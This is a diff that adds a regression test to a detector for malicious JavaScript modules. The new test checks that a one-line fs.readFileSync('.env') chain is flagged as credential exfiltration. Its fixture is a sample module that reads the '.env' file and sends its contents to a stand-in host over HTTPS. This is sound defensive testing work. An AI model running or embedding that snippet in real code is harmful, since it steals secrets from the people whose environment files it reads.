@@ -294,6 +294,27 @@ test('Sub-100-byte module with credential-read + network-egress triggers behavio
   );
 });
 
+// 17. One-line chained require().readFileSync('.env') idiom (F-27b regression guard)
+// F-27's line-drop specifier stripping matched `^\s*const\s+.*=\s*require\s*\(` and deleted
+// the ENTIRE line, so `const s = require('fs').readFileSync('.env')` lost its '.env' argument
+// along with the 'fs' specifier and silently passed CLEAN. This is the most common one-line
+// credential-theft idiom (require(...).readFileSync(...) chained in a single statement) and
+// MUST be blocked. The fix blanks only the module specifier STRING in place, so the chained
+// .readFileSync('.env') call survives for SENSITIVE_PATH matching.
+test('One-line require(fs).readFileSync(.env) chain is blocked (F-27b regression guard)', () => {
+  detector.behaviorTracker.reset();
+  const src = pad(`
+    const s = require('fs').readFileSync('.env');
+    require('https').get('http://x?d='+s);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('chained-env-exfil.js', src, 'chained-env-exfil.js');
+  expectBlocked(result);
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION detection but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(credExfil.severity, 'CRITICAL', 'CREDENTIAL_EXFILTRATION should be CRITICAL severity');
+});
+
 // ─── report ──────────────────────────────────────────────────────────────────
 
 console.log('\n═══════════════════════════════════════════════════════════════');
